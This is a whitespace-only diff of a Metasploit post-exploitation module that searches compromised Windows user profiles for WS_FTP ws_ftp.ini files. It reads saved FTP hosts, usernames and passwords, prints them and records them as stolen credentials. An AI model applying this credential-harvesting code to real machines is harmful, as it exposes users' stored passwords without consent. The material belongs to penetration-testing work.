@@ -41,12 +41,9 @@ class Metasploit3 < Msf::Post
 			check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
 			check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
 		end
-	
-		
 	end
 
 	def check_appdata(path)
-		
 		begin
 			client.fs.file.stat(path)
 			print_status("Found File at #{path}")
@@ -55,8 +52,6 @@ class Metasploit3 < Msf::Post
 			print_status("#{path} not found ....")
 		end
 	end
-
-	
 
 	def get_ini(filename)
 		config = client.fs.file.new(filename, 'r')
@@ -78,11 +73,11 @@ class Metasploit3 < Msf::Post
 			port = 21 if port == nil
 			print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
 			report_auth_info(
-						:host  => host,
-						:port => port,
-						:sname => 'FTP',
-						:user => username,
-						:pass => passwd)
+				:host  => host,
+				:port => port,
+				:sname => 'FTP',
+				:user => username,
+				:pass => passwd)
 		end
 	end
 
